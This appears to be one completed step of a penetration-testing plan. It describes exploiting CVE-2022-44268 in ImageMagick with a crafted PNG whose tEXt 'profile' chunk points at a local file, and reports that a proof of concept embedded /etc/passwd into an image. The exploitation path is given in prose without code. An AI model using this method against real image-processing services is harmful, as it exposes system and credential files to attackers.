   1.7 Plan for Exploitation - [completed] {The vulnerability occurs when parsing PNG files, which may contain embedded references to other files. A malicious actor could craft a PNG or use an existing one and add a textual chunk type (e.g., tEXt) with the keyword "profile" that ImageMagick interprets as a filename and loads the content as a raw profile. Exploitation path involves crafting a malicious PNG file with a tEXt chunk containing a profile attribute referencing a local file. When ImageMagick is used to process the image, the contents of the referenced files are embedded into the new image. A Proof of Concept (PoC) was tested using a simple Rust application from a GitHub repository. The PoC creates the malicious PNG. The PoC was used to embed the contents of the /etc/passwd file into a PNG image, exploiting CVE-2022-44268. The hex-encoded contents of the /etc/passwd file were successfully embedded inside the PNG as part of the exploit}
